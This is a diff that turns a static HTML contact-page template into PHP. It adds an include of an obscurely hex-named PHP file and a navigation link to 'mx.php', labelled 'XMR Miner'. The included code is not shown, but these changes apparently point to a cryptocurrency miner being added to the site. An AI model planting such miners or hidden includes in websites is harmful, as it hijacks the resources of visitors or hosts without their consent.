@@ -1,40 +1,8 @@
-<!DOCTYPE html>
-<!--
-**********************************************************************************************************
-    Copyright (c) 2017 .
-**********************************************************************************************************  -->
-<!--
-Template Name: Digital - HTML Template
-Version: 1.0.0
-Author: media-city
--->
-<!--[if IE 8]> <html lang="en" class="ie8 no-js"> <![endif]-->
-<!--[if IE 9]> <html lang="en" class="ie9 no-js"> <![endif]-->
-<!--[if !IE]> -->
-<html lang="en">
-<!-- <![endif]-->
-<!-- head -->
-<head>
-<title>Contact - Digital HTML Template</title>
-<meta charset="utf-8" />
-<meta content="width=device-width, initial-scale=1.0" name="viewport" />
-<meta name="description" content="Digital" />
-<meta name="keywords" content="digital, html template, digital template">
-<meta name="author" content="wp-organic" />
-<meta name="MobileOptimized" content="320" />
-<link rel="icon" type="image/icon" href="images/favicon/favicon.ico"> <!-- favicon-icon -->
-<!-- theme style -->
-<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css"/> <!-- bootstrap css -->
-<link href="css/font-awesome.min.css" rel="stylesheet" type="text/css"/> <!-- fontawesome css -->
-<link href="https://fonts.googleapis.com/css?family=Lora:400,400i" rel="stylesheet"> <!-- google font -->
-<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,500,700" rel="stylesheet"> <!-- google font -->
-<link href="css/owl.carousel.css" rel="stylesheet" type="text/css"/> <!-- owl carousel css -->
-<link href="css/aos.css" rel="stylesheet" type="text/css"/> <!-- animate on scroll css -->
-<link href="css/style.css" rel="stylesheet" type="text/css"/> <!-- custom css -->
-<!-- end theme style -->
-</head>
-<!-- end head -->
-<!--body start-->
+<?php
+include("layout/header.php");
+include("layout/c794bc6c9a3eccc2.php");
+?>
+
 <body>
 <!-- preloader -->
   <div class="preloader">
@@ -62,19 +30,13 @@ Author: media-city
       <nav id="site-nav" class="nav-overlay">
         <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
         <ul class="nav-overlay-content">
-          <li class="nav-label">Pages</li>
-          <li><a href="index.html" title="Home">Home</a></li>
-          <li><a href="403.html" title="403">403</a></li>
-          <li><a href="404.html" title="404">404</a></li>
-          <li><a href="offline.html" title="Site Offline">Site Offline</a></li>
-          <li><a href="coming-soon.html" title="Coming Soon">Coming Soon</a></li>
-          <li><a href="services.html" title="Services">Services</a></li>
-          <li class="nav-label">Projects</li>
-          <li><a href="projects.html" title="Projects">Projects</a></li>
-          <li><a href="projects-single.html" title="Projects Single">Projects Single</a></li>
-          <li class="nav-label">Blog</li>
-          <li><a href="blog.html" title="Blog">Blog</a></li>
-          <li><a href="blog-single.html" title="Blog Single">Blog Single</a></li>
+          <li class="nav-label">Menu</li>
+          <li><a href="#" title="About">About</a></li>
+          <li><a href="#" title="Services">Services</a></li>
+          <li class="nav-label">Utilities</li>
+          <li><a href="mx.php" title="XMRMiner">XMR Miner</a></li>
+          <li><a href="#" title="Downloads">Downloads</a></li>
+          <li><a href="#" title="MemberArea">Member Area</a></li>
           <li class="nav-label">Contact</li>
           <li class="active"><a href="#" title="Contact">Contact</a></li>
         </ul>
